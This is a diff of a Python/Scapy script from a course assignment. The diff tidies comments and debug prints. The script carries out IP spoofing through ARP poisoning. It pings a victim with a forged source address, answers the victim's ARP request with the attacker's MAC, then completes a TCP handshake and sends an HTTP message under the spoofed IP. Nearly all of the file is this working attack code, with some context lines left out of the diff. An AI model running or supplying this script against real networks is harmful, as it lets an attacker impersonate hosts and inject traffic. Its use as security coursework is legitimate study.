@@ -1,6 +1,11 @@
 #! /usr/bin/python
 """
-cyber assignment 2 question 1
+Assignment 2, question 1.
+
+The algorithm uses ARP poisoning to perform IP spoofing.
+An ARP request is encited by sending a ping to the victim
+and catching his subsequent ARP request. Then the attacker
+replies with his own mac and the spoofed IP address.
 """
 
 from scapy.all import conf, sniff
@@ -14,23 +19,20 @@ os.environ['http_proxy'] = ''
 
 def spoof(args):
     """
-    spoof sends a message to triger a arp and then sniffs for that arp
+    Sends a message to trigger an ARP and then sniffs for the response.
     """
 
     spoof_src_ip = args.src
-
     dst_ip = args.dst
-    # sending ping for trigering "who-has" ARP
-    print spoof_src_ip, dst_ip
+    # send ping to trigger "who-has" ARP.
     ip_pkt = IP(src=spoof_src_ip, dst=dst_ip)
-
     send(ip_pkt / ICMP())
 
 
     print "Poisoned ARP sent, waiting for response..."
-    def arp_posion(pkt):
+    def arp_poison(pkt):
         """
-        ARP posioning and send http
+        ARP poison and send http
         """
         if ARP in pkt \
             and pkt[ARP].psrc == dst_ip \
@@ -47,8 +49,6 @@ def spoof(args):
                 seq=random.randint(0, 100000), flags='S')
             syn_ack = sr1(ip_pkt / tcp_pkt)
 
-            print "Got SYN+ACK, returning ACK..."
-
             tcp_pkt = TCP(dport=8080, sport=random_port, \
             seq=syn_ack[TCP].ack, ack=(syn_ack[TCP].seq + 1), flags='A')
 
@@ -58,18 +58,14 @@ def spoof(args):
             sr1(ip_pkt / tcp_pkt / http_msg, timeout=30)
             exit()
 
-    sniff(prn=arp_posion)
+    sniff(prn=arp_poison)
 
 
 
 if __name__ == '__main__':
-    #if len(sys.argv) not in range(4, 5):
-    #    exit('Invalid arguments!')
-
     PARS = argparse.ArgumentParser()
     PARS.add_argument('-src', help="Source IP")
     PARS.add_argument('-dst', help="Destination IP")
     PARS.add_argument('-msg', help="HTTP message")
 
-    print "SPOOFIN"
     spoof(PARS.parse_args())
